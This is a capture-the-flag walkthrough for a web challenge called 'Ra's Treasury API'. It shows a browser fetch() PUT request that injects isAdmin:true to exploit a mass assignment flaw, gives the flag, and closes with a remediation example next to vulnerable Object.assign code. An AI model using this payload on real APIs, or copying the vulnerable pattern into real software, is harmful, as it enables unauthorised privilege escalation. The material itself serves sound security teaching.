# Ra's Treasury API - Official Walkthrough

## Challenge Synopsis
- **Title:** Ra's Treasury API 
- **Category:** Web 
- **Difficulty:** Medium
- **Vulnerability:** Mass Assignment (Privilege Escalation)

## Introduction 
In this challenge, we are presented with an Egyptian-themed application where we can submit offerings to the "Treasury of Ra". There is a conspicuous "Visit Admin Shrine" button that denies us access claiming: `Access denied. Only the Pharaoh's highly favored may enter.`

The goal is to elevate our privileges to access the Admin Shrine and retrieve the flag.

## Step-by-Step Solution

### Step 1: Reconnaissance (Normal Interaction)
When you submit a new offering on the site (e.g. Name: "Scarab", Value: 100), open your browser's **Network tab** (F12 Developer Tools).

Look at the JSON response returned by the backend after the `POST /api/treasure` request is made:
```json
{
  "id": 1680000000000,
  "owner": "user_xyz123",
  "name": "Scarab",
  "value": 100,
  "isAdmin": false
}
```

Notice the hidden `"isAdmin": false` field! The system creates this property but the user interface never displays it or lets us change it. The hint *"Ra sees what is given. Not what is hidden."* and *"What is unseen still exists"* point towards interacting with hidden data fields.

### Step 2: Spotting the Mass Assignment Vulnerability
We know the frontend hit a `POST` endpoint to create the treasure. In RESTful APIs, `PUT` endpoints are commonly used to update existing resources. We can attempt to update our offering using the ID provided in the previous step.

Let's send a customized `PUT` request to `/api/treasure/:id` (where `:id` is the ID of the offering we just created) and inject the `isAdmin` key to see if the backend improperly maps all user-provided data directly to the database object (a classic Mass Assignment vulnerability).

### Step 3: Exploitation
We will use `curl` or Postman (or browser fetch) to perform the update. Make sure to capture and send your `session_token` cookie that the site issued to you so the backend knows you own the offering.

Using the Developer Console (F12 -> Console) in the browser, execute the following script (replace `<YOUR_OFFERING_ID>` with the actual ID):

```javascript
// Step 3a: Perform the Mass Assignment using fetch
fetch('/api/treasure/<YOUR_OFFERING_ID>', {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ isAdmin: true }) // Injecting the hidden property
})
.then(res => res.json())
.then(data => console.log(data));
```

The server responds with the updated object:
```json
{
  "id": 1680000000000,
  "owner": "user_xyz123",
  "name": "Scarab",
  "value": 100,
  "isAdmin": true
}
```
*Success! The server blindly trusted the data payload and overwrote our offering's `isAdmin` property.*

### Step 4: Privilege Escalation & Flag Retrieval
Now that the backend recognizes us as owning an "Admin Offering", we have implicitly escalated our privileges.

Go back to the UI and click the **Visit Admin Shrine** button (which performs a `GET /api/admin/treasury` request).

The server will now validate our newly modified offering and grant us the flag:

```json
{
  "message": "Welcome, favored one. The Pharaoh's secrets are yours.",
  "flag": "NOD{ra_trusts_too_much}"
}
```

## Remediation / How to Fix
To prevent Mass Assignment vulnerabilities, developers should explicitly pick/whitelist which properties are allowed to be updated. For instance, in Node.js/Express:

```javascript
// BAD (Vulnerable to Mass Assignment)
Object.assign(treasure, req.body); 

// GOOD (Filtered and safe)
if (req.body.name) treasure.name = req.body.name;
if (req.body.value) treasure.value = req.body.value;
// Notice isAdmin is explicitly ignored
```
